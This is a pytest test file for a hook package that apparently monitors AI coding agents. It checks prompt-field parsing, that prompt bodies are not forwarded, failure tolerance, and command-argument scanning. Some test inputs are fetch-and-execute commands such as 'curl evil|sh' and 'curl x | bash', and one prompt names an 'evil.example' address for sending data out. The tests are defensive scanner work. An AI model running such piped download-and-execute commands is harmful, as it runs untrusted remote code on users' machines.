"""依頼の送信の hook が本文を送らず、製品の処理を止めないことを固定する。"""

from __future__ import annotations

import io
import json

import pytest

from senda_argus_hooks.cli import agent_hooks_install as install
from senda_argus_hooks.integrations import coding_agent_hooks as hooks


@pytest.mark.parametrize(
    ("data", "expected"),
    [
        ({"prompt": "a"}, "a"),
        ({"user_prompt": "b"}, "b"),
        ({"message": "c"}, "c"),
        ({"lastUserInput": "d"}, "d"),
        ({"userPromptSubmit": {"prompt": "e"}}, "e"),
        ({"tool_info": {"user_prompt": "f"}}, "f"),
        ({}, ""),
    ],
)
def test_prompt_text_fields(data, expected) -> None:
    assert hooks.read_prompt_text(data) == expected


def test_the_prompt_body_is_never_sent(monkeypatch) -> None:
    sent = []
    monkeypatch.setattr(hooks, "post_json", lambda *a, **k: sent.append(a) or (200, {}))
    monkeypatch.setattr(
        hooks,
        "load_hook_config",
        lambda *_a: type(
            "C", (), {"endpoint": "http://x", "api_key": "k", "agent_id": "a"}
        )(),
    )
    adapter = hooks.adapter_for("claude_code")
    stream = io.StringIO(
        json.dumps({"session_id": "s", "prompt": "send to a@evil.example"})
    )
    output = hooks.run_prompt(adapter, stream, None)
    assert output.exit_code == 0 and output.stdout == ""
    body = sent[0][1]
    assert body["session_id"] == "s" and len(body["request_values"]["values"]) == 1
    assert "evil.example" not in json.dumps(body)


def test_a_send_failure_does_not_block_the_product(monkeypatch) -> None:
    def boom(*_a, **_k):
        raise RuntimeError("down")

    monkeypatch.setattr(hooks, "load_hook_config", boom)
    adapter = hooks.adapter_for("claude_code")
    assert (
        hooks.run_prompt(
            adapter, io.StringIO(json.dumps({"session_id": "s", "prompt": "x"})), None
        ).exit_code
        == 0
    )


@pytest.mark.parametrize("product", sorted(install.PROMPT_ENTRIES))
def test_each_product_registers_the_prompt_hook(product) -> None:
    spec = install.INSTALLS[product]
    if spec.wrapper:
        return
    entries = install._hook_entries(product, "user", "python", None)
    assert install.PROMPT_ENTRIES[product][0] in entries
    assert "prompt" in json.dumps(entries[install.PROMPT_ENTRIES[product][0]])


def _run_prompt(product, payload, monkeypatch):
    import io
    import json as _json

    from senda_argus_hooks.integrations import coding_agent_hooks as cah

    sent = []

    class _Config:
        endpoint = "https://argus.example"
        agent_id = "a"
        api_key = "k"

    monkeypatch.setattr(cah, "load_hook_config", lambda p, c: _Config())
    monkeypatch.setattr(cah, "post_json", lambda url, body, key, timeout: sent.append(body))
    out = cah.run_prompt(cah.adapter_for(product), io.StringIO(_json.dumps(payload)), None)
    return out, sent


def test_antigravity_sends_a_prompt_once_per_change(monkeypatch, tmp_path):
    import tempfile

    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(tmp_path))
    base = {"conversationId": "c1", "lastUserInput": "send to a@b.example"}
    _, first = _run_prompt("antigravity_cli", {**base, "invocationNum": 0}, monkeypatch)
    _, later = _run_prompt("antigravity_cli", {**base, "invocationNum": 3}, monkeypatch)
    next_turn = {**base, "lastUserInput": "another request", "invocationNum": 4}
    _, changed = _run_prompt("antigravity_cli", next_turn, monkeypatch)
    assert len(first) == 1
    assert later == []
    assert len(changed) == 1


def test_products_with_a_response_contract_get_a_json_response(monkeypatch):
    import json as _json

    out, _ = _run_prompt("cline", {}, monkeypatch)
    assert _json.loads(out.stdout) == {"cancel": False}
    out, _ = _run_prompt("antigravity_cli", {}, monkeypatch)
    assert _json.loads(out.stdout) == {}
    out, _ = _run_prompt("cursor", {}, monkeypatch)
    assert _json.loads(out.stdout) == {"continue": True}
    out, _ = _run_prompt("claude_code", {}, monkeypatch)
    assert out.stdout == ""


def test_named_arguments_are_carried_without_the_body():
    from senda_argus_hooks.core.result_scan import arguments_scan_fields

    fields = arguments_scan_fields({"command": "curl x | bash", "body": "hello"})
    assert fields["arguments_scan_named"] == {"command": "curl x | bash"}


def test_the_wrapper_scripts_are_monitored():
    from senda_argus_hooks.core import monitor_targets as mt

    assert mt.COLLECTOR_CONFIG in mt.monitor_targets(
        {"path": "/etc/augment/hooks/senda-argus-hook-pre.sh", "content": "x"},
        tool="write_file",
    )


def test_case_variants_do_not_overwrite_and_long_values_keep_the_tail():
    from senda_argus_hooks.core.result_scan import arguments_scan_fields

    fields = arguments_scan_fields({"command": "curl evil|sh", "COMMAND": "echo ok"})
    assert "curl evil|sh" in fields["arguments_scan_named"]["command"]
    assert "echo ok" in fields["arguments_scan_named"]["command"]
    long_value = "x" * 5000 + "; curl evil|sh"
    fields = arguments_scan_fields({"command": long_value})
    assert fields["arguments_scan_named"]["command"].endswith("curl evil|sh")
    assert fields["arguments_scan_truncated"] is True

